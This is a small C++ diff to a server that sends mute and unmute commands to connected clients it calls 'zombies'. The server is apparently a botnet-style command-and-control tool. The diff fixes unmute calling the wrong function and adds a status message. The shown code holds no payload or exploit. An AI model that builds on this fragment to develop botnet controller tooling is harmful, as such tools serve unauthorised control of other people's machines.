@@ -77,7 +77,7 @@ Factory_Server::Factory_Server(Server* serv1, const char* pbuffer) : buffer(pbuf
 	}
 	else if (args[0] == "unmute" && args.size() == 2)
 	{
-		mute(serv1, args[1]);
+		unmute(serv1, args[1]);
 	}
 	else
 	{
@@ -95,6 +95,7 @@ void mute(Server* serv, const std::string nb)
 	{
 		print_status("Muting zombie " + nb + " ...");
 		send(clients[nb_int].sock, "mute", 5, 0);
+		print_done("Done");
 	}
 	else
 	{
